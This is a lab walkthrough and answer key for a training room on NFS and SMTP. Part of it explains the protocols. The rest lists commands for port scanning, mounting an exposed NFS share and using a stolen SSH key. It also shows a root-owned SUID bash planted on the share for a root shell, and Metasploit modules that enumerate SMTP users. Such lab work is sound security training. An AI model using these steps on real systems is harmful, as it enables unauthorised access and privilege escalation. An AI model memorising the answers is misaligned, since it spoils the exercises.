# Network Services 2 (Draft)

Difficulty: Easy

## Task 1 - Get Connected

- Ready? Let's get going!

	  no answer needed

## Task 2 - Understanding NFS

- What does NFS stand for?

	- `Network File System`

- What process allows an NFS client to interact with a remote directory as though it was a physical device?

	- `Mounting`

- What does NFS use to represent files and directories on the server?

	- `file handle`

- What protocol does NFS use to communicate between the server and client?

	- `rpc`

- What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

	- `user id / group id`

- Can a Windows NFS server share files with a Linux client? (Y/N)

	- `Y`

- Can a Linux NFS server share files with a MacOS client? (Y/N)

	- `Y`

- What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

	- `*.2`

## Task 3 - Enumerating NFS

- Conduct a thorough port scan of your choosing, how man ports are open?

	- `nmap -p- -A <TARGET_IP>`
	- `7`
	
- Which port contains the service we're looking to enumerate?

	- `2049`
	
- Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

	- `/home`
	
- First, use *"mkdir /tmp/mount"* to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart. Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?	
	
	- `sudo mount -t nfs <TARGET_IP>:/**** /tmp/mount -nolock`
	- `cappucino`
	
- Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...

	  no answer needed

- Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

	- `.ssh`

- Which of these keys is most useful to us?

	- `id_rsa`

- Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

	- `chmod 600 id_rsa`
	- `ssh -i id_rsa *********@<TARGET_IP>`
	- `Y`
	
## Task 4 - Exploiting NFS

- First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

	  no answer needed

- Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

	  no answer needed

- Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?

	- `s`

- Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.

	- `-rwsr-sr-x`

- Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

	  no answer needed

- Great! If all's gone well you should have a shell as root! What's the root flag?

	- `********************`

## Task 5 - Understanding SMTP

- What does SMTP stand for?

	- `Simple Mail Transfer Protocol`
	
- What does SMTP handle the sending of?

	- `emails`

- What is the first step in the SMTP process?

	- `SMTP handshake`

- What is the default SMTP port?

	- `25`

- Where does the SMTP server send the email if the recipient's server is not available?

	- `smtp queue`

- On what server does the Email ultimately end up on?

	- `pop/imap`

- Can a Linux machine run an SMTP server? (Y/N)

	- `Y`

- Can a Windows machine run an SMTP server? (Y/N)

	- `Y`
	
## Task 6 - Enumerating SMTP

- First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

	- `nmap -A -p- <TARGET_IP>`
	- `**`

- Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

	- `msfconsole`

- Let's search for the module `smtp_version`, what's it's full module name?

	- `search smtp_version`
	- `auxiliary/scanner/smtp/smtp_version`

- Great, now- select the module and list the options. How do we do this?

	- `options`

- Have a look through the options, does everything seem correct? What is the option we need to set?

	- `rhosts`

- Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

	- `polosmtp.home`

- What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

	- `postfix`

- Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module `smtp_enum`, what's it's full module name?

	- `search smtp_enum`
	- `auxiliary/scanner/smtp/smtp_enum`

- What option do we need to set to the wordlist's path?

	- `user_file`

- Once we've set this option, what is the other essential paramater we need to set?

	- `RHOSTS`

- Now, set the THREADS parameter to 16 and run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

	  no answer needed

- Okay! Now that's finished, what username is returned?

	- `administrator`
